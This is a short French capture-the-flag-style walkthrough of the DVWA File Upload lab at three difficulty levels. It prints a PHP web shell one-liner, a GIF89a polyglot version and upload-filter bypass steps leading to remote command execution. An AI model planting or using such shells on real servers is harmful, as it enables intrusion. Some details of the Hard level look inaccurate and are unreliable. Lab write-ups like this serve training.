+++
title = "DVWA - File Upload"
date = 2025-12-24
categories = ["DVWA"]
description = "Explication technique"


[taxonomies]
tags = ["cybersécurité", "DVWA", "web"]
+++


## Easy
- Aucune validation : créez `shell.php` avec `<?php system($_GET['cmd']); ?>` et uploadez-le directement.
- Accédez à `hackable/uploads/shell.php?cmd=whoami` pour avoir une RCE.
- Le serveur exécute le PHP car aucune restriction d'extension ou contenu.

## Medium
- Vérifie `$_FILES['uploadedFile']['type'] == 'image/jpeg' || 'image/png'` (Type MIME coté client modifiable).
- Bypass : Burp Suite → interceptez, changez `Content-Type: image/jpeg` et nom `shell.jpg`, uploadez PHP dedans.
- Exécutez via LFI : `fi/?page=../../hackable/uploads/shell.jpg`.

## Hard
- Extension : `getenv('DVWA_EXT')` whitelist `.jpg|.png|.gif`, prend la dernière extension → `shell.php.jpg`, donc ça passe.
- Magic Bytes : Vérifie la signature du fichier (premiers bytes) avec `finfo_file()` → `polyglot` : GIF89a + PHP.
- Créez `shell.php.jpg` : `GIF89a<?php system($_GET['cmd']); ?>`, uploadez, accédez `hackable/uploads/shell.php.jpg?cmd=id`.
